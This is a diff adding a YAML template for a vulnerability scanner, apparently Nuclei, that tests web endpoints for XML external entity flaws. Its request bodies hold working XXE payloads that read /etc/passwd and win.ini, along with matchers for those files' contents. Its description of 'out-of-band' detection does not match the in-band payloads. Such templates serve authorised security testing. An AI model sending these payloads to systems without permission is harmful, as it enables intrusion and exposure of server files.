@@ -1,0 +1,52 @@
+id: xxe-classic-oob
+info:
+  name: XXE Out-of-Band Detection
+  author: AniipID
+  severity: critical
+  description: Detects XXE vulnerabilities using out-of-band techniques with external DTD
+  tags: xxe,oob,xml,external-entity
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/xml"
+      - "{{BaseURL}}/soap"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///etc/passwd">
+      ]>
+      <root>&xxe;</root>
+    matchers:
+      - type: word
+        words:
+          - "root:x:0"
+          - "daemon:x:1"
+          - "bin:x:2"
+          - "nobody:x:"
+        condition: or
+        part: body
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/upload"
+      - "{{BaseURL}}/upload"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+      ]>
+      <root>&xxe;</root>
+    matchers:
+      - type: word
+        words:
+          - "[fonts]"
+          - "[extensions]"
+          - "[files]"
+        condition: or
+        part: body
